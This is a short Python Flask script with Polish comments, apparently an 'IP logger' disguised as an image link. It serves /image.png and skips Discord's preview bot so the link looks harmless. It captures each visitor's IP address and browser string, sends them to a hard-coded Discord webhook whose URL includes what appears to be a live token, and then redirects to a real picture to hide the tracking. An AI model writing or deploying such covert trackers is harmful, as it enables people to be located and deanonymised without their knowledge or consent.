from flask import Flask, request, redirect
import requests

app = Flask(__name__)

# Twój aktualny link do webhooka
WEBHOOK_URL = "https://discord.com/api/webhooks/1336930594799327529/VX0R1leJbv97emxJkz3rKjLKgr5BK6SgoSqcCn_cRc76VepZoxiEpPk3fcTPqgVYlyBi"

@app.route('/image.png')
def logger():
    user_agent = request.headers.get('User-Agent', '')
    
    # Ignorujemy bota Discorda, żeby nie wysyłał pustych powiadomień przy wklejaniu linku
    if "Discordbot" in user_agent:
        return redirect("https://i.ibb.co/L6M7v9V/ptak.png")

    # Pobieramy IP użytkownika
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    # Przygotowanie danych do wysłania
    data = {
        "embeds": [{
            "title": "🎯 Ktoś kliknął w logger!",
            "color": 16711680, # Czerwony kolor paska
            "fields": [
                {"name": "Adres IP", "value": f"`{ip}`", "inline": True},
                {"name": "Przeglądarka", "value": f"`{user_agent[:100]}...`", "inline": False}
            ],
            "footer": {"text": "Logger System"}
        }]
    }
    
    # Wysyłanie na Discorda
    try:
        requests.post(WEBHOOK_URL, json=data)
    except:
        pass

    # Przekierowanie do prawdziwego zdjęcia
    return redirect("https://i.ibb.co/L6M7v9V/ptak.png")

if __name__ == '__main__':
    app.run(port=10000)
